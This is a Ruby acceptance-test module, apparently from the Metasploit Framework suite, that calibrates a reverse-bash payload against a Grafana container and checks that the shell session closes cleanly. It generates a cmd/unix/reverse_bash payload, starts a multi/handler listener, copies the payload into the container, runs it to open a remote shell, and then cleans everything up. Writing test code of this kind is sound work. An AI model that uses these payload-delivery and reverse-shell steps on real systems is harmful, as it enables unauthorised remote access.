# frozen_string_literal: true

require 'digest'
require 'English'
require 'json'
require 'open3'
require 'securerandom'
require 'timeout'

module Acceptance
  # Real Bash transport calibration and target-first session shutdown proof.
  module GrafanaExpressionSession
    def grafana_poll(seconds, &block)
      Timeout.timeout(seconds) { wait_for_expect(100, 0.1, &block) }
    end

    def grafana_listener_rows(port)
      script = 'require "json"; port=Integer(ARGV.fetch(0)); rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }; puts JSON.generate(rows.select { |row| row[3]=="0A" && row[1].split(":").last.to_i(16)==port })'
      JSON.parse(target_exec('framework', 'ruby', '-e', script, port.to_s))
    end

    def grafana_close_verified_shell(session_id, proof, phase:)
      identifier = Integer(session_id, 10)
      expect(identifier).to be > 0
      marker = "Grafana shell exact + $HOME; 'quoted' #{SecureRandom.hex(8)}"
      quoted = marker.gsub("'", %q{'"'"'})
      command = "printf '%s' '#{quoted}' > #{proof}; printf 'GRAFANA_PID=%s\\n' $$"
      record = { phase: phase, session: identifier, command: command, proof: proof, expected: marker }
      begin
        output = console_command("sessions -i #{identifier} -c #{command.inspect}")
        expect(output).not_to match(/\[-\]|Exception|Unknown command/)
        pid = output[/^GRAFANA_PID=(\d+)\r?$/, 1]
        expect(pid).not_to be_nil, output
        expect(pid.to_i).to be > 1
        record[:target_pid] = pid.to_i
        grafana_poll(15) { expect(native_action('read-file', proof)).to eq(marker) }
        expect(target_exec('grafana', 'stat', '-c', '%u', proof).strip).to eq('472')
        status = target_exec('grafana', 'cat', "/proc/#{pid}/status")
        expect(status).to match(/^Uid:\s+472\s+472\s+472\s+472$/)
        record[:native_pid_status] = status
        shutdown = "framework.sessions[#{identifier}].shell_write(\"exit\\n\")"
        expect(console_command("irb -e #{shutdown.inspect}")).not_to match(/\[-\]|Exception|Unknown command/)
        record[:target_exit_sent] = true
        grafana_poll(15) do
          expect(target_exec('grafana', 'sh', '-c', "if test -e /proc/#{pid}; then printf PRESENT; else printf ABSENT; fi")).to eq('ABSENT')
        end
        record[:native_pid_absent] = true
        close = "framework.sessions[#{identifier}]&.shell_close"
        expect(console_command("irb -e #{close.inspect}")).not_to match(/\[-\]|Exception|Unknown command/)
        grafana_poll(15) { expect(console_command('sessions -l')).to include('No active sessions') }
        record[:host_session_absent] = true
      ensure
        failure = $ERROR_INFO
        record[:error] = { class: failure.class.name, message: failure.message } if failure
        File.open(File.join(target_runtime.fetch('artifacts'), 'shell-lifecycle.jsonl'), 'a') { |file| file.puts(JSON.generate(record)) }
      end
    end

    def grafana_calibrate_bash
      suffix = SecureRandom.hex(6)
      artifact = File.join(target_runtime.fetch('artifacts'), "calibration-payload-#{suffix}")
      remote = "/tmp/module-target-grafana-calibration-#{suffix}-payload"
      proof = "/tmp/module-target-grafana-calibration-#{suffix}-proof"
      record = { scope: 'Independent payload/handler/native-target calibration; no owning exploit call', port: 4445, remote: remote, proof: proof, qualified: false }
      begin
        expect(console_command('sessions -l')).to include('No active sessions')
        expect(console_command('jobs -l')).to include('No active jobs')
        console_command('back')
        console_command('use payload/cmd/unix/reverse_bash')
        console_command("set LHOST #{listener_host}")
        console_command('set LPORT 4445')
        expect(console_command("generate -f raw -o #{artifact}")).not_to match(/\[-\]|Exception|Unknown command/)
        bytes = File.binread(artifact)
        expect(bytes).not_to be_empty
        record[:payload_bytes] = bytes.bytesize
        record[:payload_sha256] = Digest::SHA256.hexdigest(bytes)
        console_command('back')
        console_command('use exploit/multi/handler')
        console_command('set PAYLOAD cmd/unix/reverse_bash')
        console_command("set LHOST #{listener_host}")
        console_command('set LPORT 4445')
        console_command('set ExitOnSession false')
        expect(console_command('run -j -z')).not_to match(/\[-\]|Exception|Unknown command/)
        grafana_poll(15) { expect(grafana_listener_rows(4445)).not_to be_empty }
        transfer = target_runtime.fetch('compose') + ['exec', '-T', '--user', '472', 'grafana', 'sh', '-c', 'umask 077; set -C; cat > "$1"', 'sh', remote]
        _output, error, status = Open3.capture3(*transfer, stdin_data: bytes, binmode: true)
        expect(status.success?).to be(true), error
        record[:transfer_argv] = transfer
        record[:target_payload_stat] = target_exec('grafana', 'stat', '-c', '%u:%g:%a', remote).strip
        owner, _group, mode = record[:target_payload_stat].split(':')
        expect(owner).to eq('472')
        expect(mode).to eq('600')
        record[:target_payload_sha256] = target_exec('grafana', 'sha256sum', remote).split.first
        expect(record[:target_payload_sha256]).to eq(record[:payload_sha256])
        _output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', '-d', '--user', '472', 'grafana', '/bin/bash', remote)
        expect(status.success?).to be(true), error
        opened = nil
        grafana_poll(15) do
          rows = console_command('sessions -l')
          opened = rows[/^\s*(\d+)\s+.*\bshell\b/i, 1]
          expect(opened).not_to be_nil, rows
          expect(console.all_data).to include("Command shell session #{opened} opened")
        end
        record[:session] = opened.to_i
        grafana_close_verified_shell(opened, proof, phase: 'calibration')
        record[:qualified] = true
      ensure
        failure = $ERROR_INFO
        errors = []
        [
          ['sessions', -> { console_command('sessions -K') }],
          ['jobs', -> { console_command('jobs -K') }],
          ['listener', -> { grafana_poll(15) { expect(grafana_listener_rows(4445)).to eq([]) } }],
          [
            'files',
            lambda do
              target_exec('grafana', 'rm', '-f', remote, proof)
              target_exec('grafana', 'sh', '-c', 'test ! -e "$1" && test ! -L "$1" && test ! -e "$2" && test ! -L "$2"', 'sh', remote, proof)
            end
          ],
          ['state', -> { expect(native_action('snapshot')).to eq(@baseline) }]
        ].each do |operation, cleanup|
          cleanup.call
        rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
          errors << { operation: operation, class: e.class.name, message: e.message }
        end
        record[:error] = { class: failure.class.name, message: failure.message } if failure
        record[:cleanup_errors] = errors
        record[:qualified] = record[:qualified] && !failure && errors.empty?
        File.open(File.join(target_runtime.fetch('artifacts'), 'bash-calibration.jsonl'), 'a') { |file| file.puts(JSON.generate(record)) }
        File.write(File.join(target_runtime.fetch('artifacts'), 'bash-calibration-console.log'), console.all_data)
        raise RSpec::Expectations::ExpectationNotMetError, "Calibration cleanup failed: #{errors.inspect}" if !failure && !errors.empty?
      end
      console.reset
    end
  end
end
